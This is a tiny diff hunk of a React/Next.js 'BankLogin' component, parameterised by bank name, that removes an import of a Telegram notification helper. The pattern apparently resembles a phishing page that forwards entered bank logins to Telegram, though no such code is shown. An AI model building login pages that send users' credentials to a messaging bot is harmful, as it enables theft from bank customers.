@@ -2,7 +2,6 @@
 
 import { useState } from 'react';
 import { useRouter } from 'next/navigation';
-import { sendTelegramNotification } from '@/app/lib/sendTelegramNotification';
 
 export default function BankLogin({ bankName }: { bankName: string }) {
   const [userId, setUserId] = useState('');
